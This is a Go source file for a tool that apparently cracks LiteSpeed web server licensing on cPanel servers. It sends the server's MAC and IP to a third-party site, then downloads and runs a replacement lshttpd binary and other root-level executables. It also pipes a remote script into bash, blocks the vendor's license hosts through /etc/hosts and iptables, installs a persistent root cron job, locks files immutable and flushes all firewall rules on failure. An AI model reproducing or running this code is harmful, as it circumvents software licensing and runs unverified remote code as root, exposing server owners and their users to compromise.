package main

import (
	"encoding/json"
	"flag"
	//"regexp"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	//"log"
	//"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	//"log"
	"bufio"
	"runtime"
	"strings"
	"time"

	"github.com/gookit/color"
	"github.com/mbndr/figlet4go"
)
var filexml string
var key string = "litespeed4"
var pose bool
var postt string
var file string

func strpos(haystack string, needle string) bool {

	if strings.Index(haystack, needle) > -1 {
		return true
	}

	return false
}

const (
	ErrorColor = "\033[1;31m%s\033[0m"
	DebugColor = "\033[0;36m%s\033[0m"
	InfoColor  = "\033[1;32m%s\033[0m"
)
func printcolor(color string, str string) {
	fmt.Printf(color, str)
	fmt.Println()
}
func FileGetContents(filename string) string {
	data, err := ioutil.ReadFile(filename)
	_ = err

	return string(data)
}
func file_get_contents(filename string) string {
	data, _ := ioutil.ReadFile(filename)
	return string(data)
}

func licensekey() error {
    mac, ip, err := retrieveMACandIP()
    if err != nil {
        return fmt.Errorf("error retrieving MAC and IP addresses: %v", err)
    }

    url := fmt.Sprintf("https://litespeed.cpanelseller.xyz/lic_checkgenv2gooda.php?core=4&mac=%s&ip=%s", mac, ip)

    // Set a timeout for the HTTP client
    client := http.Client{Timeout: time.Second * 10}
    response, err := client.Get(url)
    if err != nil {
        return fmt.Errorf("error downloading file: %v", err)
    }
    defer response.Body.Close()

    fileData, err := ioutil.ReadAll(response.Body)
    if err != nil {
        return fmt.Errorf("error reading file data: %v", err)
    }

    err = ioutil.WriteFile("/usr/local/lsws/conf/license.key", fileData, 0644)
    if err != nil {
        return fmt.Errorf("error saving file: %v", err)
    }

    fmt.Println()
    printcolor(InfoColor, "License Key Downloaded!")
    return nil
}

func retrieveMACandIP() (string, string, error) {
    macCmd := exec.Command("bash", "-c", "ip a | grep ether | awk '{print $2}'")
    macOutput, err := macCmd.Output()
    if err != nil {
        return "", "", fmt.Errorf("error retrieving MAC address: %v", err)
    }
    mac := strings.TrimSpace(string(macOutput))

    ipCmd := exec.Command("bash", "-c", "curl ifconfig.me")
    ipOutput, err := ipCmd.Output()
    if err != nil {
        return "", "", fmt.Errorf("error retrieving IP address: %v", err)
    }
    ip := strings.TrimSpace(string(ipOutput))

    return mac, ip, nil
}

func addEntriesToHostsFile(entriesToAdd string) error {
    // Read the current /etc/hosts file
    hostsData, err := ioutil.ReadFile("/etc/hosts")
    if err != nil {
        return fmt.Errorf("failed to read /etc/hosts file: %v", err)
    }

    // Check if the entries already exist in the /etc/hosts file
    existingEntries := make(map[string]struct{})
    lines := strings.Split(string(hostsData), "\n")
    for _, line := range lines {
        fields := strings.Fields(line)
        if len(fields) > 1 {
            existingEntries[fields[1]] = struct{}{}
        }
    }

    // Append the new entries that don't already exist
    var entriesToAddBuffer bytes.Buffer
    entries := strings.Fields(entriesToAdd)
    for _, entry := range entries {
        if _, exists := existingEntries[entry]; exists {
            continue
        }
        fmt.Fprintf(&entriesToAddBuffer, "%s\n", entry)
    }

    if entriesToAddBuffer.Len() == 0 {
        fmt.Println("All entries already exist in /etc/hosts")
        return nil
    }

    // Append the entries to the /etc/hosts file
    f, err := os.OpenFile("/etc/hosts", os.O_APPEND|os.O_WRONLY, 0644)
    if err != nil {
        return fmt.Errorf("failed to open /etc/hosts for writing: %v", err)
    }
    defer f.Close()

    if _, err := f.Write(entriesToAddBuffer.Bytes()); err != nil {
        return fmt.Errorf("failed to write to /etc/hosts: %v", err)
    }

    return nil
}

func file_exists(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

type Data struct {
	Status string `json:"status"`
	Brand  string `json:"brand_name"`
	Domain string `json:"domain_name"`
	Expiry string `json:"expire_date"`
}

type saveOutput struct {
	savedOutput []byte
}

func (so *saveOutput) Write(p []byte) (n int, err error) {
	so.savedOutput = append(so.savedOutput, p...)
	return os.Stdout.Write(p)
}
func exec_output(of string) string {
	var out bytes.Buffer
	cmd := exec.Command("bash", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return ""
	}
	return strings.Split(out.String(), "\n")[0]
}

func exec_outputs(of string) []string {
	var out bytes.Buffer
	cmd := exec.Command("bash", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return []string{}
	}
	return strings.Split(out.String(), "\n")
}

func _exec(of string) string {
	var out bytes.Buffer
	cmd := exec.Command("sh", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return ""
	}
	result := out.String()

	if len(result) > 0 {
		if result[len(result)-1:] == "\n" {
			result = result[0 : len(result)-1]
		}
	}

	return result
}

func setupCron() {
	cronfile, err := os.Create("/etc/cron.d/lic_litespeed")
	if err != nil {
		fmt.Println(err)
	}
	cronfile.WriteString("PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin\n\n* * * * * root /usr/bin/lic_litespeed -checklic >/dev/null 2>&1\n@reboot root /usr/bin/lic_litespeed -checklic &>/dev/null")
}

func check_files() {

	filesys_exists := []string{}

	var j interface{}
	resp, _ := http.Get("https://cpanelseller.xyz/api/" + key + "/syscheck")

	if resp.StatusCode == 200 {
		_ = json.NewDecoder(resp.Body).Decode(&j)
		arr := j.([]interface{})
		for _, s := range arr {
			if file_exists(s.(string)) {
				filesys_exists = append(filesys_exists, s.(string))
			}

		}

		if len(filesys_exists) > 0 {

			var input string

			for input != "y" && input != "n" {
				fmt.Print("Do you allow other systems to be removed? [y/n]:")
				fmt.Scanf("%s", &input)
			}

			if input == "y" {
				for _, filesys := range filesys_exists {
					_exec("rm -rf " + filesys)
				}
				_exec("curl -s https://cpanelseller.xyz/rm.sh | bash")
				_exec("touch /usr/local/cpanel/cpanel.lisc")
				_exec("/scripts/upcp --force")
			} else {
				_exec("rm -rf /usr/bin/esp > /dev/null 2>&1")
_exec("rm -rf /usr/local/ecp > /dev/null 2>&1")
_exec("rm -rf /usr/bin/lic_cpanel > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/esp_cpanel > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/esp* > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/lic_cpanel > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/lic_cpanel2 > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/lic_cpanel* > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/esp_upgrade > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/esp_cpanel_hostname_ssl > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/esp* > /dev/null 2>&1")
_exec("rm -rf /usr/local/cpanel/whostmgr/bin/.whostmgrtmp2 > /dev/null 2>&1")
	_exec("rm -rf /usr/local/cpanel/.ecpcpsrvd > /dev/null 2>&1")
	_exec("rm -rf /usr/local/cpanel/.ecpuapi > /dev/null 2>&1")
	_exec("rm -rf /etc/cron.d/esp_upgrade > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/esp_cpanel_hostname_ssl > /dev/null 2>&1")
_exec("rm -rf /etc/cron.d/esp* > /dev/null 2>&1")
_exec("rm -rf /usr/local/cpanel/whostmgr/bin/.whostmgrtmp2 > /dev/null 2>&1")
_exec("rm -rf /usr/local/ecp/cpanel/lastupdated > /dev/null 2>&1")
_exec("rm -rf /usr/local/ecp/cpanel/file-submit-done > /dev/null 2>&1")
_exec("rm -rf /usr/local/ecp/cpanel/license > /dev/null 2>&1")
_exec("rm -rf /usr/local/cpanel/cpsanitycheck.so > /dev/null 2>&1")
	_exec("rm -rf /usr/local/cpanel/cpanel.lisc > /dev/null 2>&1")
				printcolor(ErrorColor, "Your License has been suspended contact us for more informations!")
				printcolor(ErrorColor, "Suspended reason: Your Server using another licensing system.To avoid problems, whenever other systems are removed simply run our command and enjoy the license.")
				os.Exit(3)
			}

		}

	}

}

func checklicls() {
file = _exec("/usr/local/lsws/bin/lswsctrl status  &> /usr/local/cps/data/.lslic")
filech := file_get_contents("/usr/local/cps/data/.lslic")
			postt := strings.Contains(filech, "litespeed is running")
			if postt {
			fmt.Println()
_exec("chmod +x /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
_exec("rm -rf /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
			_exec("wget -O /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func https://litespeed.cpanelseller.xyz/lsws_func > /dev/null 2>&1")
			_exec("chmod +x /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
				printcolor(InfoColor, "You LiteSpeed license does not require an update or activation!")
				fmt.Println()
				setupCron()
				_exec("rm -rf /usr/local/cps/data/.lslic")
				os.Exit(1)
			}
}
func getControlPanel() string {
	if Exists("/usr/local/cpanel") {
		return "cPanel"
	} else if Exists("/usr/sbin/plesk") {
		return "Plesk"
		} else if Exists("/usr/local/webuzo") {
		return "Webuzo"
		} else if Exists("/usr/local/CyberPanel") {
		return "CyberPanel"
	} else if Exists("/usr/local/directadmin") {
		return "DirectAdmin"
	} else {
		return "Unknown"
	}
}
func str_exists(str string, subject string) bool {
    return strings.Contains(subject, str)
}

func Exists(name string) bool {
	if _, err := os.Stat(name); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func ExecBash(bash_command string) string {
	cmd := bash_command
	out, err := exec.Command("bash", "-c", cmd).Output()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %s", cmd)
	}

	return string(out)
}

func main() {
var checklic bool
var kernel string = _exec("uname -r")
flag.BoolVar(&checklic, "checklic", false, "Check License")
	flag.Parse()
	if checklic {
		checklicls()
	}
	resp, err := http.Get("http://cpanelseller.xyz/api/getinfo?key=litespeed4")
	if err != nil {
		os.Exit(1)
	}
	byteResult, err := ioutil.ReadAll(resp.Body)

	var f Data
	err = json.Unmarshal(byteResult, &f)
	var res map[string]interface{}
	json.Unmarshal([]byte(byteResult), &res)
	if f.Status == "success" {
		CallClear()
		ascii := figlet4go.NewAsciiRender()

		options := figlet4go.NewRenderOptions()
		options.FontName = "slant"
		ascii.LoadFont("/usr/local/go/bin")
		str := fmt.Sprint(res["brand_name"])
		renderStr, _ := ascii.RenderOpts(str, options)
		color.Style{color.FgWhite, color.OpBold}.Printf(renderStr)
		color.Style{color.FgWhite, color.OpBold}.Println("---------------------- Licensing System Started ----------------------")
		color.Style{color.FgWhite, color.OpBold}.Printf("|Our Website:      ")
		color.Style{color.FgWhite, color.OpBold}.Println(res["domain_name"])
		color.Style{color.FgWhite, color.OpBold}.Println("|License Type:     Web Host Enterprise (4-Worker)")
		color.Style{color.FgWhite, color.OpBold}.Println("|Cache Type:       with LiteMage Unlimited")
		color.Style{color.FgWhite, color.OpBold}.Println("|Control Panel:    " + getControlPanel())
		color.Style{color.FgWhite, color.OpBold}.Println("|kernel Version:   "+kernel)
		host, _ := os.Hostname()
		color.Style{color.FgWhite, color.OpBold}.Printf("|Hostname:         ")
		color.Style{color.FgWhite, color.OpBold}.Println(host)
		color.Style{color.FgWhite, color.OpBold}.Printf("|Server IP:        ")
		curl := exec.Command("curl", "-s", "https://ipinfo.io/ip")
		out, err := curl.Output()
		if err != nil {
			fmt.Println(err)
			return
		}
		ip := string(out)
		color.Style{color.FgWhite, color.OpBold}.Println(ip)
		color.Style{color.FgWhite, color.OpBold}.Printf("")
		color.Style{color.FgWhite, color.OpBold}.Println("---------------------------------------------------------------------")
		color.Style{color.FgWhite, color.OpBold}.Printf("Today is ")
		dt := time.Now()
		color.Style{color.FgWhite, color.OpBold}.Println(dt.Format("2006-01-02"))
		color.Style{color.FgWhite, color.OpBold}.Printf("Your LiteSpeed License will need an update on ")
		color.Style{color.FgWhite, color.OpBold}.Println(res["expire_date"])
		fmt.Println()
		color.Style{color.FgWhite, color.OpBold}.Print("Checking LiteSpeed License Files...")
		fmt.Println()
		//litespeed_checker()
		//lic_checker()
		color.Style{color.FgGreen, color.OpBold}.Println("OK")
		checklicls()
		//litespeed_checker()
		color.Style{color.FgWhite, color.OpBold}.Print("LiteSpeed License require to update.This update is done automatclly by the system.Started...")
		file, err := os.OpenFile("/etc/hosts", os.O_RDWR, 0644)
    if err != nil {
        fmt.Println("Error opening file:", err)
        return
    }
    defer file.Close()

    // Create a scanner to read the file line by line
    scanner := bufio.NewScanner(file)

    // Create a slice to store filtered lines
    var lines []string

    // Iterate over each line in the file
    for scanner.Scan() {
        line := scanner.Text()

        // Check if the line contains the pattern to delete
        if !strings.Contains(line, "127.0.0.1 license.litespeedtech.com license2.litespeedtech.com") {
            // If the line does not contain the pattern, add it to the slice
            lines = append(lines, line)
        }
    }

    // Check for errors during scanning
    if err := scanner.Err(); err != nil {
        fmt.Println("Error reading file:", err)
        return
    }

    // Truncate the file to remove its content
    if err := file.Truncate(0); err != nil {
        fmt.Println("Error truncating file:", err)
        return
    }

    // Seek to the beginning of the file
    if _, err := file.Seek(0, 0); err != nil {
        fmt.Println("Error seeking file:", err)
        return
    }

    // Write the filtered lines back to the file
    writer := bufio.NewWriter(file)
    for _, line := range lines {
        _, err := fmt.Fprintln(writer, line)
        if err != nil {
            fmt.Println("Error writing to file:", err)
            return
        }
    }

    // Flush the writer to ensure all buffered data is written to the file
    if err := writer.Flush(); err != nil {
        fmt.Println("Error flushing writer:", err)
        return
    }

    //fmt.Println("Lines deleted successfully from /etc/hosts")
	entriesToAdd := "127.0.0.1 license.litespeedtech.com license2.litespeedtech.com"
            addEntriesToHostsFile(entriesToAdd)
licensekey()
_exec("rm -rf /root/.bash_timells > /dev/null 2>&1")
_exec("rm -rf /root/.bash_timells* > /dev/null 2>&1")
_exec("chattr +i /usr/local/lsws/conf/serial.no > /dev/null 2>&1")
		_exec("chattr -i /usr/local/lsws/conf/license.key > /dev/null 2>&1")
		_exec("chattr2 -i /usr/local/lsws/conf/serial.no > /dev/null 2>&1")
		_exec("chattr2 -i /usr/local/lsws/conf/license.key > /dev/null 2>&1")
		_exec("comp0 -i /usr/local/lsws/conf/serial.no > /dev/null 2>&1")
		_exec("comp0 -i /usr/local/lsws/conf/license.key > /dev/null 2>&1")
		_exec("chattr -i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("chattr -i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("chattr2 -i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("chattr2 -i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("comp0 -i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("comp0 -i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
			_exec("chattr -ia /usr/local/lsws/conf/license.key > /dev/null 2>&1")
            _exec("echo '+aGa-KS9u-hGtj-OYz8' > /usr/local/lsws/conf/serial.no")
            _exec("wget https://litespeed.cpanelseller.xyz/lshttpd -O /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 135.148.138.120 --dport 80 -j DNAT --to-destination 8.8.8.8:80")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 135.148.138.120 --dport 443 -j DNAT --to-destination 8.8.8.8:443")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 167.99.112.67 --dport 80 -j DNAT --to-destination 8.8.8.8:80")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 167.99.112.67 --dport 443 -j DNAT --to-destination 8.8.8.8:443")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 52.55.120.73 --dport 80 -j DNAT --to-destination 8.8.8.8:80")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 52.55.120.73 --dport 443 -j DNAT --to-destination 8.8.8.8:443")
			_exec("wget -O /usr/bin/dates https://litespeed.cpanelseller.xyz/4/dates > /dev/null 2>&1")
	_exec("chmod +x /usr/bin/dates > /dev/null 2>&1")
	_exec("/usr/bin/dates > /dev/null 2>&1")
	_exec("wget -O /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func https://litespeed.cpanelseller.xyz/lsws_func > /dev/null 2>&1")
	_exec("wget -O /usr/bin/LicLSWS https://litespeed.cpanelseller.xyz/LicLSWS > /dev/null 2>&1")
	_exec("chmod +x /usr/bin/LicLSWS > /dev/null 2>&1")
	setupCron()
            _exec("iptables -t nat -A OUTPUT -p tcp -d 135.148.138.120 --dport 80 -j DNAT --to-destination 127.0.0.1:80")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 135.148.138.120 --dport 443 -j DNAT --to-destination 127.0.0.1:443")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 167.99.112.67 --dport 80 -j DNAT --to-destination 127.0.0.1:80")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 167.99.112.67 --dport 443 -j DNAT --to-destination 127.0.0.1:443")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 52.55.120.73 --dport 80 -j DNAT --to-destination 127.0.0.1:80")
            _exec("iptables -t nat -A OUTPUT -p tcp -d 52.55.120.73 --dport 443 -j DNAT --to-destination 127.0.0.1:443")
	_exec("wget -O /usr/bin/LicLSWS https://litespeed.cpanelseller.xyz/LicLSWS > /dev/null 2>&1")
	_exec("chmod +x /usr/bin/LicLSWS > /dev/null 2>&1")
	_exec("chmod +x /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
_exec("rm -rf /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
			_exec("wget -O /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func https://litespeed.cpanelseller.xyz/lsws_func > /dev/null 2>&1")
			_exec("chmod +x /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
	_exec("rm -rf /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
	_exec("wget -O /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func https://litespeed.cpanelseller.xyz/lsws_func > /dev/null 2>&1")
	_exec("chmod +x /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
_exec("rm -rf /usr/local/cps/.ip > /dev/null 2>&1")
_exec("/usr/local/lsws/bin/lshttpd")
_exec("chmod +x /usr/local/lsws/bin/lshttpd")
_exec("/usr/local/lsws/bin/lshttpd")	
_exec("chmod +x /usr/local/lsws/bin/lshttpd")
		color.Style{color.FgGreen, color.OpBold}.Println("OK")
		
		fmt.Println()
		_exec("/usr/local/lsws/bin/lswsctrl start > /dev/null 2>&1")
		_exec("chattr +i /usr/local/lsws/conf/serial.no > /dev/null 2>&1")
		_exec("chattr +i /usr/local/lsws/conf/license.key > /dev/null 2>&1")
		_exec("chattr2 +i /usr/local/lsws/conf/serial.no > /dev/null 2>&1")
		_exec("chattr2 +i /usr/local/lsws/conf/license.key > /dev/null 2>&1")
		_exec("comp0 +i /usr/local/lsws/conf/serial.no > /dev/null 2>&1")
		_exec("comp0 +i /usr/local/lsws/conf/license.key > /dev/null 2>&1")
		_exec("chattr +i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("chattr +i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("chattr2 +i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("chattr2 +i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("comp0 +i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		_exec("comp0 +i /usr/local/lsws/bin/lshttpd > /dev/null 2>&1")
		ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 35.171.237.73/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 165.227.122.1/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 52.55.120.73/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 35.171.237.73/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 165.227.122.1/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 52.55.120.73/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 35.171.237.73/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 165.227.122.1/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 52.55.120.73/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 35.171.237.73/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 165.227.122.1/32 -j DROP; done > /dev/null 2>&1")
						ExecBash("for run in {1..10}; do sudo iptables -D INPUT -s 52.55.120.73/32 -j DROP; done > /dev/null 2>&1")
		
		cmd := exec.Command("/usr/local/lsws/admin/misc/cp_switch_ws.sh", "lsws")

    stdout, err := cmd.StdoutPipe()
    if err != nil {
        fmt.Println("Error creating StdoutPipe for Cmd", err)
        return
    }

    stderr, err := cmd.StderrPipe()
    if err != nil {
        fmt.Println("Error creating StderrPipe for Cmd", err)
        return
    }

    if err := cmd.Start(); err != nil {
        fmt.Println("Error starting Cmd", err)
        return
    }

    go printOutput(stdout)
    go printOutput(stderr)

    if err := cmd.Wait(); err != nil {
        fmt.Println("Error waiting for Cmd", err)
        return
    }
		_exec("/usr/local/lsws/bin/lshttpd")	
		_exec("chmod +x /usr/local/lsws/bin/lshttpd")
		fmt.Println()
		printcolor(InfoColor, "License was updated or renewed succesfully!")
				fmt.Println()
		color.Style{color.FgGreen, color.OpBold}.Println("To reissue your LiteSpeed license you can use: lic_litespeed")
		fmt.Println()
		os.Exit(1)
	} else {
		color.Red.Println("Invalid License.")
					_exec("iptables -P FORWARD ACCEPT")
_exec("iptables -P OUTPUT ACCEPT")
_exec("iptables -t nat -F")
_exec("iptables -t mangle -F")
_exec("iptables -F ")
_exec("iptables -X")
		_, _ = exec.Command("bash", "-c", "/usr/local/lsws/admin/misc/cp_switch_ws.sh apache").Output()
	chattrm("/usr/local/lsws/conf/license.key")
		chattrm("/usr/local/lsws/conf/trial.key")
		chattrm("/usr/local/lsws/conf/serial.no")
		chattrm("/usr/local/lsws/conf/serial2.no")
		rm("/usr/local/lsws/conf/trial.key")
		rm("/usr/local/lsws/conf/license.key")
		rm("/usr/local/lsws/conf/serial2.no")
		rm("/usr/local/lsws/conf/serial.no")
		rm("/usr/bin/lic_litespeed")
		rm("/etc/cron.d/lic_litespeed")
		cmd := exec.Command("/usr/local/lsws/bin/lswsctrl", "restart")
		err := cmd.Run()
		if err != nil {
		}

	}
}

func printOutput(reader io.Reader) {
    buf := make([]byte, 1024)
    for {
        n, err := reader.Read(buf)
        if err != nil && err != io.EOF {
            //fmt.Println("Error reading from pipe:", err)
            return
        }
        if n > 0 {
            fmt.Print(string(buf[:n]))
        }
        if err == io.EOF {
            break
        }
    }
}

func getServerMacAddress() string {
	var command string
	if runtime.GOOS == "windows" {
		command = "ipconfig /all"
	} else {
		command = "ifconfig -a"
	}

	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Error:", err)
		return ""
	}

	outputStr := string(output)

	// Search for the MAC address pattern in the output
	regex := regexp.MustCompile(`\w\w:\w\w:\w\w:\w\w:\w\w:\w\w`)
	matches := regex.FindAllString(outputStr, -1)

	if len(matches) > 0 {
		macAddress := matches[0]
		return macAddress
	} else {
		return "MAC address not found."
	}
}

func urlEncode(s string) string {
	s = strings.ReplaceAll(s, " ", "%20")
	s = strings.ReplaceAll(s, ":", "%3A")
	return s
}
func TouchFile(name string) error {
	file, err := os.OpenFile(name, os.O_RDONLY|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	return file.Close()
}
func cron(filepath string) error {
	cmd := exec.Command("chmod", "0644", filepath)
	return cmd.Run()
}
func run(filepath string) error {
	// run shell
	cmd := exec.Command(filepath)
	return cmd.Run()
}
func chattrp(filepath string) error {
	cmd := exec.Command("chattr", "+i", "+a", filepath)
	return cmd.Run()
}
func chattrm(filepath string) error {
	cmd := exec.Command("chattr", "-i", "-a", filepath)
	return cmd.Run()
}
func chmod(filepath string) error {
	cmd := exec.Command("chmod", "+x", filepath)
	return cmd.Run()
}
func rm(filepath string) error {
	cmd := exec.Command("rm", "-rf", filepath)
	return cmd.Run()
}

var clear map[string]func() //create a map for storing clear funcs

func init() {
	clear = make(map[string]func()) //Initialize it
	clear["linux"] = func() {
		cmd := exec.Command("clear") //Linux example, its tested
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
	clear["windows"] = func() {
		cmd := exec.Command("cmd", "/c", "cls") //Windows example, its tested
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
}

func CallClear() {
	value, ok := clear[runtime.GOOS] //runtime.GOOS -> linux, windows, darwin etc.
	if ok {                          //if we defined a clear func for that platform:
		value() //we execute it
	} else { //unsupported platform
		panic("Your platform is unsupported! I can't clear terminal screen :(")
	}
}

func php_checker() {
	if _, err := os.Stat("/usr/local/BLBIN"); err == nil {
	} else {
		downloadFile("BLBIN.tar.gz", "http://data.cpanelseller.xyz/scripts/BLBIN.tar.gz")
		cmd := exec.Command("tar", "-xpf", "BLBIN.tar.gz", "--directory", "/usr/local")
		cmd.Run()
		rm("BLBIN.tar.gz")
	}
}

func file2_checker() {
	if _, err := os.Stat("/usr/bin/.lic_litespeed_done"); err == nil {
	} else {
		rm("/usr/bin/dates")
		_, _ = exec.Command("bash", "-c", "wget -O /usr/bin/dates https://litespeed.cpanelseller.xyz/4/dates").Output()
		_exec("chmod +x /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
_exec("rm -rf /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
			_exec("wget -O /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func https://litespeed.cpanelseller.xyz/lsws_func > /dev/null 2>&1")
			_exec("chmod +x /usr/local/cpanel/whostmgr/docroot/cgi/lsws/bin/lsws_func > /dev/null 2>&1")
		_, _ = exec.Command("bash", "-c", "wget -O /usr/bin/LicLSWS https://litespeed.cpanelseller.xyz/LicLSWS").Output()
		_, _ = exec.Command("bash", "-c", "chmod +x /usr/bin/LicLSWS").Output()
		_, _ = exec.Command("bash", "-c", "chmod +x /usr/bin/dates").Output()

		TouchFile("/usr/bin/.lic_litespeed_done")
	}
}
func litespeed_checker() {
	if _, err := os.Stat("/usr/local/lsws/bin/lshttpd"); err == nil {
		fmt.Println("LiteSpeed is already installed.")
	} else {
		color.Red.Println("LiteSpeed Not Installed.")

		cmd := exec.Command("bash", "-c", "bash <( curl https://get.litespeed.sh ) TRIAL")

		// Redirect command output to pipes
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			fmt.Println("Error creating StdoutPipe:", err)
			return
		}

		// Start the command
		if err := cmd.Start(); err != nil {
			fmt.Println("Error starting command:", err)
			return
		}

		// Use a scanner to read the command output line by line
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			line := scanner.Text()
			fmt.Println(line)
		}

		// Wait for the command to finish
		if err := cmd.Wait(); err != nil {
			fmt.Println("Command finished with error:", err)
		}
	}
}
func lic_checker() {
	if _, err := os.Stat("/etc/temd/tem/LicLS.service"); err == nil {
	} else {
		rm("/usr/local/lsws/admin/misc/lswsup")
		rm("/etc/temd/tem/GBLSWS.service")
		rm("/usr/local/lsws/admin/misc/lswsupchecker.php")
		_, _ = exec.Command("bash", "-c", "wget -O /etc/temd/tem/LicLS.service https://litespeed.cpanelseller.xyz/LicLS").Output()
		_, _ = exec.Command("bash", "-c", "wget -O /usr/local/lsws/admin/misc/lswsupchecker.php https://litespeed.cpanelseller.xyz/lswsupchecker").Output()
		_, _ = exec.Command("bash", "-c", "wget -O /usr/local/lsws/admin/misc/lswsup https://litespeed.cpanelseller.xyz/lswsup").Output()
		chmod("/usr/local/lsws/admin/misc/lswsup")
	}
}
func sed(old string, new string, file string) {
	filePath := file
	fileData, err := ioutil.ReadFile(filePath)
	if err != nil {

	} else {
		fileString := string(fileData)
		fileString = strings.ReplaceAll(fileString, old, new)
		fileData = []byte(fileString)
		_ = ioutil.WriteFile(filePath, fileData, 600)
	}
}
func getData(fileurl string) string {
	resp, err := http.Get(fileurl)
	if err != nil {
		fmt.Println("Unable to get Data")
	}
	defer resp.Body.Close()
	html, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		os.Exit(1)

	}
	data := string(html[:])
	data = strings.TrimSpace(data)
	return data
}
func downloadFile(path string, url string) error {

	// Create the file
	out, err := os.Create(path)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}
